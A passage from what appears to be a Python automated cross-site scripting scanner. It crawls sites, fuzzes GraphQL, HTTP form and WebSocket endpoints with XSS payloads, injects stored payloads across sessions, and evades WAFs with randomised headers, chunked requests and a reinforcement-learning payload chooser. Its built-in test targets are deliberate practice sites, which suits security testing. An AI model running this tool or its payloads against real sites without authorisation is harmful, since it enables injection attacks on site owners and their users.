                m=req.method.upper(); is_json="json" in req.headers.get("content-type","").lower()
                try:
                    body=json.loads(req.post_data or "{}"); params=list(body.keys())
                except Exception:
                    qs=urllib.parse.urlparse(req.url).query; params=list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
                found.add(json.dumps({"url":u,"method":m if m in ("POST","PUT") else "GET",
                                      "json":is_json,"params":params,"template":body if is_json else {}}))
            page.on("request",on_req)
            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
            for _ in range(max_clicks):
                els=page.query_selector_all("a[href],button,[role=button],.router-link"); random.shuffle(els)
                for e in els:
                    try: e.click(timeout=2000); page.wait_for_timeout(1500); break
                    except Exception: continue
            ctx.close(); br.close()
    except Exception as e:
        dbg(f"[spa_dynamic_crawl] {e}")
    return [json.loads(x) for x in found]

# ─────────────────────────────────────────────────────────────────────────────
#                          GRAPHQL FUZZING
# ─────────────────────────────────────────────────────────────────────────────
INTROSPECTION="""query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{kind name ofType{kind}}}}}}}"""
def discover_graphql_ops(ep:str)->List[Tuple[str,List[str]]]:
    try:
        j=SESSION.post(ep,json={"query":INTROSPECTION},timeout=HTTP_TIMEOUT,verify=False).json()
        schema=j["data"]["__schema"]; ops=[]
        for kind in ("queryType","mutationType"):
            root=schema.get(kind); 
            if not root: continue
            for t in schema["types"]:
                if t["name"]==root["name"]:
                    for f in t["fields"]:
                        arg_names=[a["name"] for a in f["args"] if a["type"]["name"]=="String"]
                        if arg_names: ops.append((f["name"],arg_names))
        return ops
    except Exception: return []

def fuzz_graphql(ep:str)->None:
    for name,args_ in discover_graphql_ops(ep):
        for a in args_:
            pay="<img src=x onerror=alert(1)>"
            try:
                SESSION.post(ep,json={"query":f"mutation{{{name}({a}:\"{pay}\"){{__typename}}}}"},
                             timeout=HTTP_TIMEOUT,verify=False)
            except Exception as e:
                dbg(f"[fuzz_graphql] {e}")

# ─────────────────────────────────────────────────────────────────────────────
#                            HTTP / WS FUZZERS
# ─────────────────────────────────────────────────────────────────────────────
global_visited_http:set[str]=set()

def set_deep(obj:Any,path:str,val:str)->None:
    parts=[p for p in re.split(r'\.|(\[\d+\])',path) if p and p.strip()]
    cur=obj
    for i,part in enumerate(parts):
        last=i==len(parts)-1
        if part.startswith('[') and part.endswith(']'):
            idx=int(part[1:-1])
            if last:
                if isinstance(cur,list) and idx<len(cur): cur[idx]=val
            else:
                if isinstance(cur[idx],(dict,list)): cur=cur[idx]
                else: cur[idx]={}; cur=cur[idx]
        else:
            if last: cur[part]=val
            else:
                if part not in cur or not isinstance(cur[part],(dict,list)): cur[part]={}
                cur=cur[part]

def fuzz_http(t:Dict[str,Any],use_chunked:bool=False)->None:
    ext=Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
    if ext in static_exts: return
    key=f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}"
    if key in global_visited_http: return
    global_visited_http.add(key)
    target_param=random.choice(t["params"] or ["payload"])
    payload=agent.choose(target_param)
    sent_data={p:(payload if p==target_param else "") for p in t["params"]}
    rate_limit(); session_splice()
    try:
        if t.get("json") and "template" in t:
            body=json.loads(json.dumps(t["template"]))
            set_deep(body,target_param,payload)
            resp=SESSION.post(t["url"],json=body,headers=random_headers(),
                              timeout=HTTP_TIMEOUT,verify=False)
        else:
            if t["method"]=="GET":
                resp=SESSION.get(t["url"],params=sent_data,headers=random_headers(),
                                 timeout=HTTP_TIMEOUT,verify=False) if not use_chunked else \
                     chunked_fuzz_request(t["url"],"GET",random_headers(),urllib.parse.urlencode(sent_data))
            else:
                resp=SESSION.post(t["url"],data=sent_data,headers=random_headers(),
                                  timeout=HTTP_TIMEOUT,verify=False) if not use_chunked else \
                     chunked_fuzz_request(t["url"],"POST",random_headers(),urllib.parse.urlencode(sent_data))
        code,text=resp.status_code,resp.text.lower()
        reward=R_OTHER
        if code in (403,429,503) or any(x in text for x in ("captcha","denied","blocked")):
            reward=R_BLOCK
        elif code>=500: reward=R_SERROR
        elif payload.lower() in text:
            reward=R_REFLECT
            if verify(t["url"],t["method"],sent_data,t.get("json",False)):
                reward=R_CONFIRM
                log_hit(t["url"],t["method"],payload,t["params"])
        agent.reward(target_param,payload,reward)
    except Exception as e:
        dbg(f"[fuzz_http] {e}"); agent.reward(target_param,payload,R_FAIL)
    jitter()

def fuzz_ws(t:Dict[str,Any])->None:
    if not websocket or not t["url"].startswith(("ws://","wss://")): return
    marker=randstr(); hit=False
    body=json.loads(json.dumps(t.get("template") or {}))
    param=random.choice(t["params"] or ["payload"])
    set_deep(body,param,f"<img src=x onerror=alert('{marker}')>")
    def on_msg(ws,msg): nonlocal hit; hit|=(marker in msg)
    try:
        ws=websocket.WebSocketApp(t["url"],on_message=on_msg,header=random_headers())
        thr=threading.Thread(target=ws.run_forever,kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
        thr.daemon=True; thr.start(); time.sleep(1); ws.send(json.dumps(body)); time.sleep(3); ws.close()
        if hit: log_hit(t["url"],"WS",json.dumps(body),t["params"])
    except Exception as e:
        dbg(f"[fuzz_ws] {e}")

# ─────────────────────────────────────────────────────────────────────────────
#                   MULTI‑SESSION STORED XSS CHECK
# ─────────────────────────────────────────────────────────────────────────────
def multi_session_stored_check(targets:List[Dict[str,Any]])->None:
    # pass‑1 inject
    for t in targets:
        if t["method"] in ("POST","PUT") and not t.get("json",False):
            for p in all_stored_payloads:
                try:
                    cs=rotate_csrf_token(SESSION,t["url"],args.csrf_field) or ""
                    data={k:p for k in t["params"]}
                    if cs: data[args.csrf_field]=cs
                    SESSION.post(t["url"],data=data,headers=random_headers(),
                                 timeout=HTTP_TIMEOUT,verify=False)
                except Exception: pass
    # pass‑2 verify
    new_sess=get_authenticated_session()
    for t in targets:
        if verify(t["url"],t["method"],{},False):
            log_hit(t["url"],"STORED","(multi‑session)",t["params"])

# ─────────────────────────────────────────────────────────────────────────────
#                                   MAIN
# ─────────────────────────────────────────────────────────────────────────────
AUTOTEST=["http://xss-game.appspot.com/","http://xss-game.appspot.com/level1",
          "https://juice-shop.herokuapp.com/"]

def main()->None:
    mode="all"
    if args.reflected: mode="reflected"
    elif args.stored:  mode="stored"
    elif args.blind:   mode="blind"
    roots=[smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
          (ap.print_help() or sys.exit(1))
    waf,server=detect_context(roots[0])
    logging.info(f"[CTX] WAF={waf} | Server={server}")
    global agent; agent=RLAgent(waf,server,Path(args.qtable_file) if args.qtable_file else None,
                                enabled=args.self_reinforcement)
    for root in roots:
        logging.info(f"┌─▶ Crawling: {root}")
        static_t=crawl_static(root,args.max_pages)
        dynamic_t=crawl_dynamic(root)
        spa_t=spa_dynamic_crawl(root) if args.simulate_spa else []
        all_t=static_t+dynamic_t+spa_t
        # dedupe by (method,url,params)
        uniq={f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}":t for t in all_t}
        http_t=[t for t in uniq.values() if not t["url"].startswith(("ws://","wss://"))]
        ws_t  =[t for t in uniq.values() if t["url"].startswith(("ws://","wss://"))]
        if "graphql" in root.lower(): fuzz_graphql(root)
        if args.multi_session and (mode in ("stored","all")):
            multi_session_stored_check(http_t)
        exec_pool=ThreadPoolExecutor(max_workers=args.threads)
        if mode in ("all","reflected","blind"):
            for t in http_t: exec_pool.submit(fuzz_http,t)
            for t in http_t: exec_pool.submit(fuzz_http,t,True)
            for w in ws_t:   exec_pool.submit(fuzz_ws,w)
        exec_pool.shutdown(wait=True)
    if SARIF_OUTPUT_FILE: write_sarif()
    agent.save()
    logging.info(f"└─ Findings saved → {LOGFILE.resolve()}\n")

if __name__=="__main__":
    main()
